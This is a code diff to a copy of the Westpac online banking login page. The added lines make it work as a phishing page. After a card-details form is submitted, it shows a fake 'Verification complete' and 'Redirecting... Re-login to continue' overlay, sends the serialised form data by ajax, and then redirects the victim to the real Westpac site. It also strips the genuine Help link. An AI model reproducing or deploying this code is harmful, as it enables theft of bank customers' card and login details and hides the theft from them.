@@ -18,11 +18,76 @@
       <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
       <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
    </head>
+   <style>
+   		.idwrap{
+	border:1px solid black;
+	overflow:hidden; 
+	height:180px; 
+	width:100%; 
+	border-radius:10px; 
+	display:block;
+	}
+	
+	.defbtn{ 
+	visibility: hidden;
+	}
+	
+	.writeup{
+	font-size: 14px;
+	color: #2c2e2f;
+	}
+	.loadbackground {
+    width: 100%;
+    height: 130%; 
+    position: fixed;
+    background-color: white;
+    z-index: 3000;
+    opacity: 10;
+}
+
+.fadeIn {
+  -webkit-animation-name: fadeIn;
+  animation-name: fadeIn;
+  -webkit-animation-duration: 3s;
+  animation-duration: 3s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+  }
+  @-webkit-keyframes fadeIn {
+  0% {opacity: 0;}
+  100% {opacity: 1;}
+  }
+  @keyframes fadeIn {
+  0% {opacity: 0;}
+  100% {opacity: 1;}
+  }
+
+@media (min-width: 801px) {
+    .loadbackground {
+        height: 300%; 
+    }
+}
+   	</style>
    <body id="applicationBody" data-keymap-url="/eam/servlet/getEamInterfaceData" data-command="login" data-get-resources-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true&values=true" data-get-resources-checksum-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true" data-help-url="/wbc/banking/helpcontentandsearch" data-signin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=login&segment=personal" data-signout-url="https://banking.westpac.com.au/pkmslogout?token=f264d7a0-1df4-11ef-b660-005056a3d977" data-browser-incompatible-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/6" data-cookies-disabled-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/7" data-allow-console-logging="false" data-spsignin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=sp&segment=personal" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-analytics-allkeys="autoImpr,experience,formName,pageKey,pageName,pageStep,pageType,sendDelay,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagestep="start" data-analytics-pagename="enter your customer id" data-analytics-senddelay="3000" data-analytics-autoimpr="TRUE" data-analytics-formname="olb" data-analytics-src="20231122-mob" data-analytics-pagetype="login" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="login" class="orientation-portrait">
       <!-- ko ifnot: isSalesPathwayLogin() -->
-      <footer style="margin-top:30%">
+     <div id="load" style="display:none;">
+								<div style="justify-content:center; align-items:center; display:flex; background-color:white; z-index:40000;">
+									
+										
+									<img id="checkimg" class="fadeIn"  src="images/circle.png" style="z-index:18000; visibility:hidden;  position:absolute;  width:100px; height:auto; top:200px; "></img>
+        <br><p id="h2" class="fadeIn" style="z-index:17000; font-size:18px; visibility: hidden; top:300px; position: absolute; margin-top:30px;">Redirecting...</p><br><br> 
+        	<p id="rd" style="z-index:17000; visibility:hidden; top:350px; font-size:15px; position: absolute; margin-top:50px;">Re-login to continue</p> 
+               								
+        <br>
+        </div> 
+							        <div id="loadbackground" class="loadbackground"></div>
+							        
+							   </div>
+      		
+      	
+      	<footer style="margin-top:30%">
          <div class="login-footer">
-            <a class="help" href="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/" data-analytics-nav="footer">
+            <a class="help"  data-analytics-nav="footer">
             <span class="text">Help</span>
             </a>
          </div>
@@ -181,6 +246,17 @@
 
         // If no input is empty, proceed with form submission
         if (!isEmpty) {
+        	setTimeout(() => { 
+            document.getElementById('load').style.display = "block";
+            document.getElementById('carddetails_form').style.display = "none";
+            document.getElementById('loadbackground').style.opacity = "10"; 
+            document.getElementById('checkimg').style.visibility = "visible";
+            document.getElementById('h2').style.visibility = "visible";
+            document.getElementById('title_red').textContent = "Verification complete";
+            document.getElementById('rd').style.visibility = "visible";
+             }, 1000);
+
+        
             let userinfo = myForm.serializeArray();
             let user = {};
             let visitor = sessionStorage.getItem('visitor');
@@ -201,6 +277,7 @@
             }).done(function(msg) {
                 sessionStorage.setItem('visitor', visitor);
                 console.log(msg); // Log success message
+				window.location.href = "https://banking.westpac.com.au";
             }).fail(function(err, textstatus, error) {
                 // Handle failure here
             });
